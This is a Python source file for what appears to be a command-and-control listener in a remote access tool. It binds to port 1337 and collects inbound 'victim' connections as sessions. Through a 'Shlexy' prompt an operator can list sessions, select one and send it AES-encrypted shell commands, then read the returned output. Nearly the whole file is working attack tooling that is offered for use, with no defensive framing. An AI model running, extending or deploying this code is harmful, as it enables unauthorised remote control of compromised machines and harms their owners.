import shlex
import socket
import threading
from _thread import *
from textwrap import wrap
from time import sleep
from Crypto.Cipher import AES
from os import urandom
from rich.console import Console
from rich.table import Table
from rich import box
from rich.live import Live
from rich import print
import queue
from base64 import b64encode, b64decode

console = Console()
server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


class ConnHandler:
    def __init__(self, ip=None, port=None):
        self.ip = ip
        self.port = port
        self.q = queue.Queue()
        self.connections = []
        self.address = []
        self.jobnum = [1, 2]
        self.key = None
        self.iv = None

    def CreateSocket(self):
        try:
            server.bind((self.ip, self.port))
            console.print(f'[-] Started listener on {self.ip}:{self.port}\n', style="red")
            server.listen(5)
            while True:
                victim, address = server.accept()
                self.connections.append(victim)
                self.address.append(address)
                print("")
                console.log(f"[bold magenta][-] Got connection ->[/bold magenta] {address}", end="")

        except socket.error:
            console.print_exception()

    def list_Connections(self):
        for number, connection in enumerate(self.connections):
            """Filter live connections"""
            try:
                connection.send("l".encode())
                connection.recv(1024)
            except:
                del self.connections[number]
                del self.address[number]
        """Display tables after filtering"""
        table = Table(show_header=True, show_lines=True, box=box.ASCII)
        table.add_column("Sessions_id")
        table.add_column("Victim_Address")
        with Live(table, refresh_per_second=4) as live:
            if not self.connections:
                table.add_row("[bold red]x", "[red]No connections")
            for number, connection in enumerate(self.connections):
                table.add_row(str(number), str(self.address[number][0]))

    def encrypt(self, cmd):
        block_size = 16
        pad = lambda s: s + (block_size - len(s) % block_size) * "\x0e"  # chr(block_size - len(s) % block_size)
        self.key = urandom(16)
        self.iv = urandom(16)
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        encrypted = aes.encrypt(pad(cmd).encode())  # Needs a check to verify block size
        text_with_key = b64encode(self.key + self.iv + encrypted)
        return text_with_key

    def decrypt(self, data):
        data = b64decode(data)
        stream = [data[i:i + 16] for i in range(0, len(data), 16)]
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypted = [aes.decrypt(i) for i in stream]
        return b''.join(decrypted).decode()

    def Execute(self, sessionID):
        try:
            while True:
                cmd = console.input(f"[green]({self.address[sessionID][0]})> [/green]").strip()
                if "quit" in cmd:
                    break
                enc_cmd = self.encrypt(cmd)
                self.connections[sessionID].send(enc_cmd)
                data = self.connections[sessionID].recv(1024)
                decrypted = self.decrypt(data)
                console.print(decrypted.replace(r"\n", "\n").strip(), style="cyan", end="")
        except KeyboardInterrupt:  # Doesn't work because __main__ exception needs to be handled
            console.print("[-] Ctrl+C detected -> type quit to exit")

    def kill_Sessions(self, sessionID=None):
        if sessionID == '*':
            for i, connection in enumerate(self.connections):
                console.print(f"[+] Killing {self.address[i]}", style="red")
                del self.connections[i]
                del self.address[i]
                connection.close()
        else:
            sessionID = int(sessionID)
            self.connections[sessionID].close()
            del self.connections[sessionID]
            del self.address[sessionID]

    def shlexy(self):
        try:
            while True:
                cmd = console.input("[green](Shlexy)> [/green]").strip()
                cmd = shlex.split(cmd)
                if "list" in cmd:
                    self.list_Connections()
                elif "use" in cmd:
                    sessionID = cmd[1]
                    self.Execute(int(sessionID))
                elif "kill" in cmd:
                    sessionID = cmd[1]
                    self.kill_Sessions(sessionID)
                else:
                    continue
        except KeyboardInterrupt:
            console.print_exception()

    def create_workers(self):
        for _ in range(2):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    """Retrieve them"""

    def create_jobs(self):
        for x in self.jobnum:
            self.q.put(x)
        self.q.join()

    # Do next job that is in the queue (handle connections, send commands)
    def work(self):
        try:
            while True:
                x = self.q.get()
                if x == 1:
                    self.CreateSocket()
                if x == 2:
                    sleep(0.3)  # To ensure it loads after the listener
                    self.shlexy()
                self.q.task_done()
        except KeyboardInterrupt:
            console.print_exception()


if __name__ == '__main__':
    try:
        run = ConnHandler("0.0.0.0", 1337)
        run.create_workers()
        run.create_jobs()
    except KeyboardInterrupt:  # Doesn't exit ?
        console.print("\n[-] Ctrl+d to quit", style="red")
    except EOFError:
        console.print("\n[*] Exited", style="bold red")
        exit(1)
